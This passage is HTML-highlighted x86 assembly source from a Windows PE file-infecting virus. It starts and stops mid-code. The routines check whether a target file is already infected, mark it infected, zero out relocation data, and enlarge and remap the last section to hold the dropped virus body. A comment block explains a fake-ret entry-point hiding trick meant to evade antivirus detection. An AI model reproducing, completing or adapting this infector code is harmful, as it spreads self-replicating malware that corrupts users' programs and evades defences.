</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">thatsfine</span><span class="sc0">               </span><span class="sc1">; entrypoint in code section ?</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">19</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">thatsfine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">processinfection</span><span class="sc0">            </span><span class="sc1">; not infected ?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">processinfection</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04000h</span><span class="sc0">              
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; set file state infected</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">version</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; for future flush</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">doitright</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; reflush it !</span><span class="sc0">

</span><span class="sc5">doitright</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">processinfection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">132</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; check that export is not</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">damnthatit</span><span class="sc0">              </span><span class="sc1">; null!</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,-</span><span class="sc2">25</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">damnthatit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; code section</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">allright</span><span class="sc0">                </span><span class="sc1">; check code section normal</span><span class="sc0">
                        </span><span class="sc1">; to use nulls at the end</span><span class="sc0">
</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,-</span><span class="sc2">18</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">allright</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">version</span><span class="sc0">                 </span><span class="sc1">; set version</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">killrelocs</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">getitnow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; zero the reloc to each </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; section</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getitnow</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; zeroizing the </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getthatnow</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RVA2Offset</span><span class="sc0">              </span><span class="sc1">; reloc table</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; zero the section</span><span class="sc0">
    
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; zero the reloc size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ler.'</span><span class="sc0">          </span><span class="sc1">; kill section</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipgetit</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; zero it from disk</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">skipgetit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">getthatnow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dropcode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; load number of section</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                  </span><span class="sc1">; size of section</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; go to last section</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; restore edx wich point</span><span class="sc0">
                        </span><span class="sc1">; to start of section</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">     </span><span class="sc1">; modify the segment state</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc2">1111111b</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">10000000b</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">virsize</span><span class="sc0">                 </span><span class="sc1">; load the size</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; calculate were virus binary</span><span class="sc0">
</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc5">dropplace</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; is placed</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; save it near "PE"</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; now calculate exact size</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ResizeAndRemap</span><span class="sc0">              </span><span class="sc1">; remap it!</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; set the section size!</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; set image size</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; set loaded size</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hide Entry Point</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The idea,  well, as usal, a call or a jmp in the last section is very </span><span class="sc0">
</span><span class="sc1">; suspicious, here we use a program opcode in order to jump to our virus.</span><span class="sc0">
</span><span class="sc1">; You will tell me how if we don't use call/jmp, well, we will fake a ret</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The idea is the following:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       PUSHAD                          &lt;- this for restoring state</span><span class="sc0">
</span><span class="sc1">;       PUSH Imm</span><span class="sc0">
</span><span class="sc1">;       XOR dword ptr [esp], Imm</span><span class="sc0">
</span><span class="sc1">;       ADD dword ptr [esp], Imm</span><span class="sc0">
</span><span class="sc1">;       SUB dword ptr [esp], Imm</span><span class="sc0">
</span><span class="sc1">;       ROL/ROR dword ptr [esp],Imm</span><span class="sc0">
</span><span class="sc1">;       jmp to ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; we have in fact two possibility, drop this code in alignment cave and/or</span><span class="sc0">
</span><span class="sc1">; drop in the end of code section, wich have often series of zeroes coz</span><span class="sc0">
</span><span class="sc1">; alignment</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">HideEP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">

</span><span class="sc5">connectval</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dispval</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">doomconstate</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
